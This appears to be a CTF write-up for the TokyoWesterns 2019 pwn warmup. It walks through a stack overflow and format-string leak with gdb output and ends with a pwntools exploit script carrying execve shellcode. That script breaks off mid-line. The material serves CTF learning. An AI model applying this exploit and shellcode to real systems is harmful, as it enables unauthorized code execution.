# TokyoWesterns CTF 2019 - nothing more to say

* **Category:** pwn, warmup  
* **Points:** (dependant on solve time)

## Challenge

### Description  
> Japan is fucking hot.  
> nc nothing.chal.ctf.westerns.tokyo 10001

### Files  
* warmup.c  
* warmup

## Solution

This challenge contained two seperate vulnerabilities, a stack buffer
overflow, and a format string vulnerabilty.  Additionally, all protections
were disabled.

The vulnerabilities can be seen in the provided source code...

```c  
int main(void) {  
   char buf[0x100];  
   init_proc();  
   puts("Hello ...etc... :)");  
   gets(buf);                   // <-- stack buffer overflow  
   printf(buf);         // <-- format string vulnerability  
   return 0;  
}  
```

We can verify that all protections are disabled using checksec...

```  
gef➤  checksec  
[+] checksec for '/tmp/warmup'  
Canary                        : No  
NX                            : No  
PIE                           : No  
Fortify                       : No  
RelRO                         : Partial  
gef➤  
```

That said, since PIE (ASLR) is only disabled for **this** binary, everything
else will still be randomized, including the libc and the stack.  Luckily, we
can abuse the format string vulnerability to leak pointers, and since we can
overwrite main's return address, we can redirect it back to `_start`
afterward.  This gives us a second opportunity to exploit the overflow, after
leaking a useful pointer.  Let's walk through it.

The return address will be overwritten at offset 264...

```  
andrew@fujitsu /tmp % python -c 'print "A"*264 + "BBBBBBBB";' > input  
```

```  
gef➤  r < input  
Starting program: /tmp/warmup < input  
Hello CTF Players!  
This is a warmup challenge for pwnable.  
We provide some hints for beginners spawning a shell to get the flag.

1. This binary has no SSP (Stack Smash Protection). So you can get control of instruction pointer with stack overflow.  
2. NX-bit is disabled. You can run your shellcode easily.  
3. PIE (Position Independent Executable) is also disabled. Some memory addresses are fixed by default.

If you get stuck, we recommend you to search about ROP and x64-shellcode.  
Please pwn me :)  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB  
Program received signal SIGSEGV, Segmentation fault.  
[ Legend: Modified register | Code | Heap | Stack | String ]  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
registers ────  
$rax   : 0x0  
$rbx   : 0x0  
$rcx   : 0x0  
$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000  
$rsp   : 0x00007fffffffdeb8  →  "BBBBBBBB"  
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)  
$rsi   : 0x00007fffffffb710  →
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"  
$rdi   : 0x1  
$rip   : 0x0000000000400709  →  <main+79> ret  
$r8    : 0x110  
$r9    : 0x00007ffff7fdb4c0  →  0x00007ffff7fdb4c0  →  [loop detected]  
$r10   : 0x3  
$r11   : 0x246  
$r12   : 0x0000000000400590  →  <_start+0> xor ebp, ebp  
$r13   : 0x00007fffffffdf90  →  0x0000000000000001  
$r14   : 0x0  
$r15   : 0x0  
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow
RESUME virtualx86 identification]  
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
stack ────  
0x00007fffffffdeb8│+0x0000: "BBBBBBBB"   ← $rsp  
0x00007fffffffdec0│+0x0008: 0x0000000000000000  
0x00007fffffffdec8│+0x0010: 0x00007fffffffdf98  →  0x00007fffffffe317  →
"/tmp/warmup"  
0x00007fffffffded0│+0x0018: 0x0000000100008000  
0x00007fffffffded8│+0x0020: 0x00000000004006ba  →  <main+0> push rbp  
0x00007fffffffdee0│+0x0028: 0x0000000000000000  
0x00007fffffffdee8│+0x0030: 0xfb9b0c21f2f5366f  
0x00007fffffffdef0│+0x0038: 0x0000000000400590  →  <_start+0> xor ebp, ebp  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
code:x86:64 ────  
    0x4006fe <main+68>        call   0x400570 <printf@plt>  
    0x400703 <main+73>        mov    eax, 0x0  
    0x400708 <main+78>        leave    
→   0x400709 <main+79>        ret  
[!] Cannot disassemble from $PC  
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
threads ────  
[#0] Id 1, Name: "warmup", stopped, reason: SIGSEGV  
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
trace ────  
[#0] 0x400709 → main()  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
0x0000000000400709 in main ()  
```

`_start`'s address is `0x400590`...

```  
gef➤  p -start  
$1 = {<text variable, no debug info>} 0x400590 <_start>  
```

Now lets look for a useful pointer.  Ideally, something on the stack near our
buffer, that we can use to reliably calculate its address...

Our stack is in the range: `0x00007ffffffde000 0x00007ffffffff000`

```  
gef➤  vmmap  
Start              End                Offset             Perm Path  
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /tmp/warmup  
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-x /tmp/warmup  
0x0000000000601000 0x0000000000602000 0x0000000000001000 rwx /tmp/warmup  
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 ---
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-x
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rwx
/lib/x86_64-linux-gnu/libc-2.27.so  
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rwx  
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x
/lib/x86_64-linux-gnu/ld-2.27.so  
0x00007ffff7fda000 0x00007ffff7fdc000 0x0000000000000000 rwx  
0x00007ffff7ff8000 0x00007ffff7ffb000 0x0000000000000000 r-- [vvar]  
0x00007ffff7ffb000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]  
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-x
/lib/x86_64-linux-gnu/ld-2.27.so  
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rwx
/lib/x86_64-linux-gnu/ld-2.27.so  
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rwx  
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]  
```

The stack looks like this.  And there are some stack pointers accessible!

```  
gef➤  break printf  
Breakpoint 1 at 0x400570  
gef➤  r  
... snip ... snip ...  
Breakpoint 1, __printf (format=0x7fffffffddb0 "whatever") at printf.c:28  
28      printf.c: No such file or directory.  
gef➤  x/64gx $rsp  
0x7fffffffdda8: 0x0000000000400703      0x7265766574616877  
0x7fffffffddb8: 0x0000000000000000      0x0000000000000000  
0x7fffffffddc8: 0x00007ffff7ffe710      0x00007ffff7b97787  
0x7fffffffddd8: 0x0000000000000380      0x00007fffffffde10  
0x7fffffffdde8: 0x00007fffffffde20      0x00007ffff7ffea98  
0x7fffffffddf8: 0x0000000000000000      0x0000000000000000  
0x7fffffffde08: 0x0000000000000000      0x00000000ffffffff  
0x7fffffffde18: 0x0000000000000000      0x00007ffff7ffb268  
0x7fffffffde28: 0x00007ffff7ffe710      0x0000000000000000  
0x7fffffffde38: 0x0000000000000000      0x0000000000000000  
0x7fffffffde48: 0x00000000756e6547      0x0000000000000009  
0x7fffffffde58: 0x00007ffff7dd7660      0x00007fffffffdec8  
0x7fffffffde68: 0x0000000000f0b5ff      0x0000000000000001  
0x7fffffffde78: 0x000000000040075d      0x00007ffff7de59a0  
0x7fffffffde88: 0x0000000000000000      0x0000000000400710  
0x7fffffffde98: 0x0000000000400590      0x00007fffffffdf90  
0x7fffffffdea8: 0x0000000000000000      0x0000000000400710  
0x7fffffffdeb8: 0x00007ffff7a05b97      0x0000000000000001  
0x7fffffffdec8: 0x00007fffffffdf98      0x0000000100008000  <-- this one (on
the left) looks good  
0x7fffffffded8: 0x00000000004006ba      0x0000000000000000  
0x7fffffffdee8: 0x2bfdf5ba6193f872      0x0000000000400590  
0x7fffffffdef8: 0x00007fffffffdf90      0x0000000000000000  
0x7fffffffdf08: 0x0000000000000000      0xd4020ac5d233f872  
0x7fffffffdf18: 0xd4021a7ad92df872      0x00007fff00000000  
0x7fffffffdf28: 0x0000000000000000      0x0000000000000000  
0x7fffffffdf38: 0x00007ffff7de5733      0x00007ffff7dcb638  
0x7fffffffdf48: 0x0000000014e55a46      0x0000000000000000  
0x7fffffffdf58: 0x0000000000000000      0x0000000000000000  
0x7fffffffdf68: 0x0000000000400590      0x00007fffffffdf90  
0x7fffffffdf78: 0x00000000004005ba      0x00007fffffffdf88  
0x7fffffffdf88: 0x000000000000001c      0x0000000000000001  
0x7fffffffdf98: 0x00007fffffffe317      0x0000000000000000  
```

Let's leak the pointer `0x00007fffffffdf98`.  There are 36 QWORDs on the stack
above it.  However, since this is a 64-bit program, printf will also look in
`rsi`, `rdx`, `rcx`, `r8`, and `r9` first.  36 + 5 = 41, meaning we want to
leak the 41st QWORD.

```  
gef➤  r  
Starting program: /tmp/warmup  
Hello CTF Players!  
This is a warmup challenge for pwnable.  
We provide some hints for beginners spawning a shell to get the flag.

1. This binary has no SSP (Stack Smash Protection). So you can get control of instruction pointer with stack overflow.  
2. NX-bit is disabled. You can run your shellcode easily.  
3. PIE (Position Independent Executable) is also disabled. Some memory addresses are fixed by default.

If you get stuck, we recommend you to search about ROP and x64-shellcode.  
Please pwn me :)  
%41$016lx  
00007fffffffdf98[Inferior 1 (process 9302) exited normally]  
gef➤  
```

It worked!  We can now calculate our buffer address at an offset of this
pointer.  Our buffer is at address `0x00007fffffffddb0` which we can see in
`rdi` right before printf is called.

`00007fffffffdf98 - 0x00007fffffffddb0 = 0x1e8`

Therefore, our buffer will always be at `addr - 0x1e8`

Putting it all together, we will  
1. Overflow the buffer with `%41$016lx ...264 total bytes + address_of_main`  
2. Use the leaked pointer to calculate the buffer address  
3. Send another overflow, this time with `nops... + shellcode + address_of_buffer`  
4. Enjoy our shell!

```python  
#!/usr/bin/python2

from pwn import *  
import struct

ADDR_START = 0x400590

# https://www.exploit-db.com/shellcodes/47008  
sc = "\x48\x83\xEC\x40" # sub rsp, 64  
sc += "\x48\x31\xf6\x56\x48\xbf"  
sc += "\x2f\x62\x69\x6e\x2f"  
sc += "\x2f\x73\x68\x57\x54"  
sc += "\x5f\xb0\x3b\x99\x0f\x05"

r = remote("127.0.0.1", 10001)

r.recvuntil(":)\n")

r.send("%41$016lx" + "A"*(264-9) + struct.pack("

Original writeup
(https://github.com/kernelpoppers/ctf_writeups/tree/master/TokyoWesterns2019/nothing_more_to_say).